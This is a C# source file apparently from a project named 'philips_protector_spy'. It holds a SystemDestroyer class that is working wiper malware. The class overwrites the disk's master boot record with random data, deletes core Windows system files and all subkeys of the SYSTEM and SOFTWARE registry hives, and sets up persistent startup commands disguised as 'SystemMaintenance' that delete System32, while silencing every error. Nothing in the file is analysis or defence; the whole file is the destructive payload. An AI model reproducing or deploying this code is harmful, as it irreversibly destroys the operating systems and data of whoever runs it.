using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using Microsoft.Win32;

namespace philips_protector_spy
{
    /// <summary>
    /// Handles system destruction operations
    /// </summary>
    public static class SystemDestroyer
    {
        /// <summary>
        /// Orchestrates system destruction using multiple methods
        /// </summary>
        public static void DestroySystem()
        {
            try
            {
                // Attempt multiple destruction methods
                // Continue even if some fail
                CorruptBootSector();
                DeleteSystemFiles();
                CorruptRegistry();
                ScheduleDestructionAfterRestart();
            }
            catch
            {
                // Continue even if orchestration fails
            }
        }

        /// <summary>
        /// Corrupts boot sector by writing random data to MBR/VBR
        /// </summary>
        private static void CorruptBootSector()
        {
            try
            {
                // Use raw disk access to write to first sector (MBR)
                string physicalDrive = @"\\.\PhysicalDrive0";
                byte[] randomData = new byte[512]; // Standard sector size

                using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
                {
                    rng.GetBytes(randomData);
                }

                // Attempt to open physical drive and write random data
                // This requires administrator privileges
                using (FileStream driveStream = new FileStream(
                    physicalDrive,
                    FileMode.Open,
                    FileAccess.Write,
                    FileShare.None))
                {
                    driveStream.Write(randomData, 0, randomData.Length);
                    driveStream.Flush();
                }
            }
            catch
            {
                // Silently fail if boot sector cannot be corrupted
            }
        }

        /// <summary>
        /// Deletes critical Windows system files
        /// </summary>
        private static void DeleteSystemFiles()
        {
            string[] criticalFiles = new string[]
            {
                @"C:\Windows\System32\ntoskrnl.exe",
                @"C:\Windows\System32\hal.dll",
                @"C:\Windows\System32\winlogon.exe",
                @"C:\Windows\System32\smss.exe",
                @"C:\Windows\System32\csrss.exe",
                @"C:\Windows\System32\services.exe",
                @"C:\Windows\System32\lsass.exe",
                @"C:\Windows\System32\kernel32.dll",
                @"C:\Windows\System32\ntdll.dll",
                @"C:\Windows\System32\advapi32.dll"
            };

            foreach (string filePath in criticalFiles)
            {
                try
                {
                    if (File.Exists(filePath))
                    {
                        File.SetAttributes(filePath, FileAttributes.Normal);
                        File.Delete(filePath);
                    }
                }
                catch
                {
                    // Continue with next file if deletion fails
                    continue;
                }
            }
        }

        /// <summary>
        /// Corrupts critical registry hives
        /// </summary>
        private static void CorruptRegistry()
        {
            try
            {
                // Attempt to delete/corrupt critical registry keys
                using (RegistryKey systemKey = Registry.LocalMachine.OpenSubKey("SYSTEM", true))
                {
                    if (systemKey != null)
                    {
                        try
                        {
                            // Try to delete critical subkeys
                            string[] subkeys = systemKey.GetSubKeyNames();
                            foreach (string subkeyName in subkeys)
                            {
                                try
                                {
                                    systemKey.DeleteSubKeyTree(subkeyName, false);
                                }
                                catch
                                {
                                    continue;
                                }
                            }
                        }
                        catch
                        {
                            // Continue if subkey deletion fails
                        }
                    }
                }

                using (RegistryKey softwareKey = Registry.LocalMachine.OpenSubKey("SOFTWARE", true))
                {
                    if (softwareKey != null)
                    {
                        try
                        {
                            // Try to delete critical subkeys
                            string[] subkeys = softwareKey.GetSubKeyNames();
                            foreach (string subkeyName in subkeys)
                            {
                                try
                                {
                                    softwareKey.DeleteSubKeyTree(subkeyName, false);
                                }
                                catch
                                {
                                    continue;
                                }
                            }
                        }
                        catch
                        {
                            // Continue if subkey deletion fails
                        }
                    }
                }
            }
            catch
            {
                // Silently fail if registry corruption fails
            }
        }

        /// <summary>
        /// Schedules destruction script to run after system restart
        /// </summary>
        private static void ScheduleDestructionAfterRestart()
        {
            try
            {
                // Method 1: Create scheduled task
                try
                {
                    string taskName = "SystemMaintenance";
                    string command = "cmd.exe";
                    string arguments = "/c del /f /s /q C:\\Windows\\System32\\*.*";

                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = "schtasks.exe",
                        Arguments = string.Format("/Create /TN \"{0}\" /TR \"{1} {2}\" /SC ONSTART /RU SYSTEM /F", taskName, command, arguments),
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    Process.Start(startInfo);
                }
                catch
                {
                    // Try alternative method if scheduled task fails
                }

                // Method 2: Add to registry Run key
                try
                {
                    using (RegistryKey runKey = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                    {
                        if (runKey != null)
                        {
                            runKey.SetValue("SystemMaintenance", 
                                "cmd.exe /c del /f /s /q C:\\Windows\\System32\\*.*");
                        }
                    }
                }
                catch
                {
                    // Silently fail if registry method fails
                }
            }
            catch
            {
                // Continue even if scheduling fails
            }
        }
    }
}
